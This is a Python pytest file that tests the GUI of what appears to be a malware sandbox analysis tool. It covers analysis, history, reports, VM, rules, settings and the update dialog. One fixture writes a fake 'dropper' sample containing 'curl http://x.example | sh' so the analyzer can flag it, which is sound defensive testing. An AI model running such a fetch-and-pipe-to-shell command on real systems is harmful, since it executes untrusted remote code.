import os
import time

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
QtWidgets = pytest.importorskip("PySide6.QtWidgets")

from yemu import config as yemu_config  # noqa: E402
from yemu import paths  # noqa: E402


@pytest.fixture(scope="module")
def qapp():
    return QtWidgets.QApplication.instance() or QtWidgets.QApplication([])


def pump(app, cond, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        app.processEvents()
        if cond():
            return True
        time.sleep(0.02)
    app.processEvents()
    return cond()


@pytest.fixture
def gui(qapp, tmp_path):
    cfg = yemu_config.load()
    cfg["vm"].update(backend="mock", default_vm="mock-ubuntu")
    cfg["analysis"]["execution_wait"] = 0
    yemu_config.save(cfg)
    from yemu.gui.app import create_window

    ctx, win = create_window(qapp)
    assert pump(qapp, lambda: ctx.db_ready)
    yield qapp, ctx, win
    ctx.shutdown()
    win.deleteLater()
    qapp.processEvents()


def test_mock_analysis_end_to_end_through_gui(gui, tmp_path):
    app, ctx, win = gui
    sample = tmp_path / "dropper.sh"
    sample.write_text("curl http://x.example | sh\nencrypt decrypt .locked\n", encoding="utf-8")

    page = win.pages["analyze"]
    assert pump(app, lambda: page.snap_combo.currentText() == "clean-baseline")
    page.set_sample(str(sample))
    assert page.start_btn.isEnabled()
    page.start()
    assert pump(app, lambda: not ctx.analysis_running, 60)
    assert pump(app, lambda: not page.result_card.isHidden())  # window is never shown in tests
    assert page.tracker.state("cleanup") == "done"
    analysis_id = page.last_analysis_id

    win.nav.setCurrentRow(1)
    history = win.pages["history"]
    assert pump(app, lambda: history.model.rowCount() == 1)
    history.search.setText("nomatch")
    assert history.proxy.rowCount() == 0
    history.search.setText("dropper")
    assert history.proxy.rowCount() == 1

    win.open_report(analysis_id)
    report = win.pages["report"]
    assert pump(app, lambda: report.report is not None)
    assert report.report["verdict"] in ("suspicious", "malicious")
    assert report.yara_tree.topLevelItemCount() >= 2
    assert report.proc_tree.topLevelItemCount() == 1  # malware_sample -> curl
    assert report.b_model.rowCount() > 0
    # guest/sample-controlled strings must never be rendered as HTML
    from PySide6.QtCore import Qt

    assert report.title.textFormat() == Qt.TextFormat.PlainText
    assert page.result_title.textFormat() == Qt.TextFormat.PlainText
    report.b_type.setCurrentText("network")
    assert 0 < report.b_proxy.rowCount() < report.b_model.rowCount()


def test_vms_rules_and_settings_pages(gui):
    app, ctx, win = gui
    win.nav.setCurrentRow(2)
    vms = win.pages["vms"]
    assert pump(app, lambda: vms.model.rowCount() == 2)
    assert not vms.create_btn.isEnabled()  # mock backend cannot provision

    rules = win.pages["rules"]
    rules._select_path(paths.BUILTIN_RULES_FILE)
    assert rules.editor.isReadOnly()
    rules._validate()
    assert "compiles" in rules.status.text()

    settings = win.pages["settings"]
    settings.exec_wait.setValue(7)
    settings.theme.setCurrentText("dark")
    assert not settings.repo.isEnabled()  # repo fields only apply to a custom GitHub source
    settings.rule_source.setCurrentIndex(settings.rule_source.findData("forge:extended"))
    settings.rules_interval.setValue(3)
    settings.app_check.setChecked(False)
    settings.save()
    saved = yemu_config.load()
    assert saved["analysis"]["execution_wait"] == 7
    assert saved["ui"]["theme"] == "dark"
    assert (saved["rules"]["source"], saved["rules"]["package"]) == ("yara-forge", "extended")
    assert saved["rules"]["update_interval_days"] == 3
    assert saved["updates"]["check_on_startup"] is False
    assert ctx.backend.name == "mock"


def test_update_badge_and_dialog(gui):
    app, ctx, win = gui
    release = {
        "version": "9.9.9",
        "tag": "v9.9.9",
        "name": "YEMU v9.9.9",
        "url": "https://example.invalid/r",
        "notes": "<b>not html</b>",
        "published": "2026-10-01T00:00:00Z",
        "assets": {"yemu-9.9.9-py3-none-any.whl": "https://example.invalid/yemu.whl"},
    }
    ctx.update_available.emit(release)
    app.processEvents()
    assert not win.update_btn.isHidden() and "9.9.9" in win.update_btn.text()

    from yemu.gui.update_dialog import UpdateDialog

    dlg = UpdateDialog(ctx, release, win)
    assert dlg.hint.text().startswith("pip install --upgrade")  # tests run from source, not a frozen build
    assert not dlg.primary.isHidden() and dlg.primary.text() == "Copy command"
    dlg.deleteLater()
